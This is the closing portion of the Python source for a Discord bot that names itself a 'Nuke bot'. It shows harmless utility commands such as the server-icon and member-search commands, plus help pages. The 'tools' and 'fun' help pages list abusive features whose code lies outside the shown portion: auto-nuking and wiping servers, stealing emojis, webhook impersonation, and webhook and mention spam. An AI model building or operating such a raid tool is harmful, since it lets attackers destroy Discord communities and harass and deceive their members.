    e.add_field(name="Guilds",   value=len(bot.guilds),                 inline=True)
    e.add_field(name="Users",    value=sum(g.member_count for g in bot.guilds), inline=True)
    e.add_field(name="Commands", value=len(bot.commands),               inline=True)
    e.add_field(name="Latency",  value=f"{bot.latency*1000:.1f}ms",    inline=True)
    e.add_field(name="Prefix",   value="`!`",                          inline=True)
    await ctx.send(embed=e)

@bot.command()
async def guildicon(ctx):
    """Show the server icon in full size."""
    if not ctx.guild.icon:
        await ctx.send("❌ No server icon set."); return
    e = discord.Embed(title=f"🖼️ {ctx.guild.name} — Icon", color=0x5865F2)
    e.set_image(url=ctx.guild.icon.url)
    await ctx.send(embed=e)

@bot.command()
async def guildbanner(ctx):
    """Show the server banner in full size."""
    if not ctx.guild.banner:
        await ctx.send("❌ No server banner set."); return
    e = discord.Embed(title=f"🖼️ {ctx.guild.name} — Banner", color=0x5865F2)
    e.set_image(url=ctx.guild.banner.url)
    await ctx.send(embed=e)

@bot.command()
async def findmember(ctx, *, query: str):
    """Search for a member by name or nickname (partial match)."""
    matches = [m for m in ctx.guild.members
               if query.lower() in m.name.lower()
               or (m.nick and query.lower() in m.nick.lower())]
    if not matches:
        await ctx.send(f"❌ No members matching `{query}`."); return
    e = discord.Embed(title=f"🔍 Members matching '{query}' ({len(matches)})", color=0x5865F2)
    e.description = "\n".join(f"{m.mention} `{m.id}`" for m in matches[:20])
    await ctx.send(embed=e)

# ═══════════════════════════════════════════════════════════════════
# UPDATE HELP PAGES — add new categories
# ═══════════════════════════════════════════════════════════════════
HELP_PAGES.update({
    "utility": {
        "label": "🛠️ Utility",
        "color": 0x5865F2,
        "title": "🛠️  Utility & Info Commands",
        "text": (
            "`!avatar [user]` — Full-size avatar\n"
            "`!whois <id>` — Look up any Discord user by ID\n"
            "`!botinfo` — Bot statistics\n"
            "`!guildicon` — Server icon\n"
            "`!guildbanner` — Server banner\n"
            "`!serverstats` — Full server statistics\n"
            "`!countall` — Count everything in server\n"
            "`!snowflake <id>` — Decode a Discord snowflake\n"
            "`!color <hex>` — Show color preview\n"
            "`!hex2rgb <hex>` — Hex to RGB\n"
            "`!calc <expr>` — Calculator (+,-,*,/,**,%)\n"
            "`!encode <text>` — Base64 encode\n"
            "`!decode <text>` — Base64 decode\n"
            "`!timestamp <unix>` — Convert Unix timestamp\n"
            "`!charcount <text>` — Count chars/words\n"
            "`!botperms [#ch]` — Bot's permissions\n"
            "`!userperms <user> [#ch]` — Effective user perms\n"
            "`!chinfo [#ch]` — Detailed channel info\n"
            "`!roleperms <role>` — Role permissions list\n"
            "`!findmember <query>` — Search member by name\n"
        ),
    },
    "fun": {
        "label": "🎉 Fun",
        "color": 0xff69b4,
        "title": "🎉  Fun & Text Commands",
        "text": (
            "`!mock <text>` — mOcK TeXt\n"
            "`!clap <text>` — 👏 between 👏 words\n"
            "`!reverse <text>` — Reverse text\n"
            "`!bigtext <text>` — 🅱️🅸🅶 regional letters\n"
            "`!spoilerspam <text>` — ||every|| ||word|| spoilered\n"
            "`!aesthetic <text>` — Ｆｕｌｌｗｉｄｔｈ text\n"
            "`!uwu <text>` — UwU-ify text\n"
            "`!leet <text>` — l33t speak\n"
            "`!morse <text>` — Morse code\n"
            "`!binary <text>` — Binary encoding\n"
            "`!rot13 <text>` — ROT13 cipher\n"
            "`!shout <text>` — SHOUT!!!\n"
            "`!stutter <text>` — S-stutter\n"
            "`!zalgotext [n] <text>` — Z̷̢̛͓̓a̷l̷g̸o̵ text\n"
            "`!noisespam [n]` — Random Unicode noise spam\n"
            "`!mentionspam <user> <n>` — Spam pings\n"
            "`!poll <q> | <opt1> | <opt2>` — Reaction poll\n"
            "`!snipe` — Last deleted message\n"
            "`!editsnipe` — Last edited message\n"
            "`!snipeclear` — Clear snipe cache\n"
        ),
    },
    "warns": {
        "label": "⚠️ Warns",
        "color": 0xffa500,
        "title": "⚠️  Warning System",
        "text": (
            "`!warn <user> [reason]` — Warn a member\n"
            "`!warnings <user>` — Show all warnings\n"
            "`!warncount <user>` — Warning count\n"
            "`!clearwarns <user>` — Clear all warnings\n"
            "`!delwarn <user> <id>` — Delete one warning\n"
            "`!topwarns [n]` — Most warned members\n"
            "`!masswarn <role> [reason]` — Warn whole role\n\n"
            "**Warnings are persistent** — saved to disk, survive restarts.\n"
            "Warned users are **auto-DM'd** their warning with reason.\n"
        ),
    },
    "tools": {
        "label": "🔧 Tools",
        "color": 0x57f287,
        "title": "🔧  Advanced Tools",
        "text": (
            "**Backup / Restore:**\n"
            "`!backup [label]` — Snapshot server structure\n"
            "`!backuplist` — List all backups\n"
            "`!backupdelete <id>` — Delete a backup\n"
            "`!restore <id>` — Recreate channels/roles from backup\n\n"
            "**AutoNuke:**\n"
            "`!autonuke <guild_id> <channel> <msg>` — Arm auto-nuke\n"
            "`!autonukeclear [guild_id]` — Disarm\n"
            "`!autonutelist` — List armed nukes\n\n"
            "**Server Tools:**\n"
            "`!wipeserver` — Delete everything\n"
            "`!stealemoji <guild_id>` — Steal emojis\n"
            "`!impersonate <user> <msg>` — Webhook impersonation\n"
            "`!createwebhook [#ch] [name]` — Create webhook\n"
            "`!webhookspam <url> <n> <msg>` — Spam via webhook URL\n"
            "`!kickbots` — Kick all bots\n"
            "`!prunembers [days]` — Prune inactive members\n"
            "`!scheduleannounce <secs> <#ch> <msg>` — Schedule message\n"
            "`!globalannounce <msg>` — Announce to all guilds\n"
            "`!tempban <user> <hours> [reason]` — Auto-expiring ban\n"
        ),
    },
})

# ─────────────────────────────────────────────
# READY
# ─────────────────────────────────────────────

@bot.event
async def on_ready():
    print(f"Nuke bot ready: {bot.user} | {len(bot.guilds)} guild(s) | {len(WHITELIST)} whitelisted")
    print(f"Whitelist: {sorted(WHITELIST)}")
    print(f"Commands: {len(bot.commands)}")

bot.run(os.getenv("NUKE_TOKEN"))
